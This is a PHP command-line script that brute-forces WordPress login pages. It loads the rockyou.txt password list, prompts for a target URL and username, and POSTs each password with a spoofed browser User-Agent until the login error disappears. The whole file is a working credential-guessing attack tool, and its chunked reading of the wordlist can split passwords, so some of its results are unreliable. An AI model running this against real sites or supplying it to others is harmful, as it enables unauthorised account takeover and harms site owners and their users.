<?php
    class Wordpress{
        /**
         * @var string  $default
         */
        private string $default    = '/mnt/d/Dev/rockyou.txt';
        /**
         * @var string  $filename
         */
        private string $fileName;
        /**
         * @var resource  $file
         */
        private $file;
        /**
         * @var string  $url
         */
        private string $url;
        /**
         * @var string  $username
         */
        private string $username;
        private bool $bruteForce = True;
        /**
         * @return void
         */
        public function __construct(){
            $this->read ();     # Setting wordlist
            $this->setUrl ();   # Setting wordpress site url
            $this->setUser ();  # Setting username
            $this->_run ();     # Starting brute force
        }
        /**
         * Reading wordlist
         * 
         * @return void
         */
        private function read(){
            $filename       = readline('Type wordlist location (empty for default): ');
            if ($filename && file_exists($filename)){ // custom wordlist
                $this->fileName = basename($filename);
                print           "\033[35m[~] Loading {$this->fileName} wordlist, please wait...\033[0m\n";
                $this->file     = fopen($filename, 'r');
                print           "\033[32m{$this->fileName} loaded successfuly...\033[0m\n";
            } else { // default wordlist
                $this->fileName = basename($this->default);
                print           "\033[35m[~] Loading {$this->fileName} wordlist, please wait...\033[0m\n";
                $this->file     = fopen($this->default, 'r');
                print           "\033[32m{$this->fileName} loaded successfuly...\033[0m\n";
            }
        }
        /**
         * Setting WP Site to brute force
         * 
         * @return void
         */
        private function setUrl(){
            $url            = readline('Type WP Site Login: ');
            $this->url      = $url;
        }
        /**
         * Setting username to bruteforce
         * 
         * @return void
         */
        private function setUser(){
            $username       = readline('Type username to bruteforce: ');
            if (empty($username)){
                print       "\033[31m[!] Please type username!!!\033[0m\n";
                return $this->setUser();
            } else {
                $this->username = $username;
            }
        }
        /**
         * Starting brute force attack
         * 
         * @return void
         */
        private function _run(){
            $start_time     = time();
            while (!feof($this->file) && $this->bruteForce == true){
                $password = explode("\n", fread($this->file, 4096));
                foreach ($password as $pass){
                    $curl   = curl_init ($this->url);
                    curl_setopt_array($curl, [
                        CURLOPT_POST            => TRUE,
                        CURLOPT_POSTFIELDS      => ['log' => $this->username, 'pwd' => $pass],
                        CURLOPT_RETURNTRANSFER  => TRUE,
                        CURLOPT_HTTPHEADER => ['User-Agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19']
                    ]);
                    $result = curl_exec($curl);
                    if (strpos($result, '<div id="login_error">')){
                        print   "Testing {$pass}\n";
                    } else {
                        print   "Pass found - {$pass}\n";
                        $this->bruteForce = False;
                        break;break;
                    }
                }
            }
            $finish         = time() - $start_time;
            $minutes        = round($finish / 60);
            $seconds        = round($finish % 60);
            print           "\033[35m[~] Finished in {$minutes} minutes, {$seconds} seconds!\033[0m\n";
        }
    }

    $wordpress = new Wordpress;